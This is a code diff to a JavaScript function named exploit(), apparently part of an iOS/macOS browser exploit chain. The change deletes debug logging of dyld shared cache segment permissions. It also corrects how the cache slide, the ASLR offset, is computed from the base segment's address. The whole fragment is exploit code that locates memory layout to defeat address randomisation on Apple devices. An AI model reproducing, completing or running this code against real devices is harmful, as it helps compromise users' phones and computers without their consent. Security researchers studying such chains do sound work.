@@ -566,55 +566,13 @@ function exploit(){
             };
             dcache_segs.push(seg);
         
-            
-            var max_rights = "";
-            var init_rights = "";
-            //log(seg.maxprot)
-            if(seg.maxprot & VM_PROT_NONE){
-                max_rights += "-";
-            }
-            if(seg.maxprot & VM_PROT_READ) {
-                max_rights += "r";
-            }
-            if(seg.maxprot & VM_PROT_WRITE) {
-                max_rights += "w";
-            }
-            if(seg.maxprot & VM_PROT_EXECUTE){
-                max_rights += "x";
-            }
-            if(seg.initprot & VM_PROT_NONE){
-                init_rights += "-";
-            }
-            if(seg.initprot & VM_PROT_READ) {
-                init_rights += "r";
-            }
-            if(seg.initprot & VM_PROT_WRITE) {
-                init_rights += "w";
-            }
-            if(seg.initprot & VM_PROT_EXECUTE){
-                init_rights += "x";
-            }
-            if(max_rights.length < 4){
-                while(max_rights.length < 4) {
-                    max_rights = max_rights + "-";
-                }
-                
-            }
-            if(init_rights.length < 4){
-                while(init_rights.length < 4) {
-                init_rights = init_rights + "-";
-                }
-            }
-            
-            log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
-            
             if(seg.fileoff == 0 && seg.size != 0) {
             dcache_base_seg = seg;
             //log("dcache base seg@"+dcache_base_seg)
         } else {
         fail("base_seg");
     }
-        var cache_slide = Sub(dcache_base, seg.addr);
+        var cache_slide = Sub(dcache_base,dcache_base_seg.addr);
         log("cache_slide =" + cache_slide);
         for(var i = 0; i < dcache_segs.length; ++i)
         {
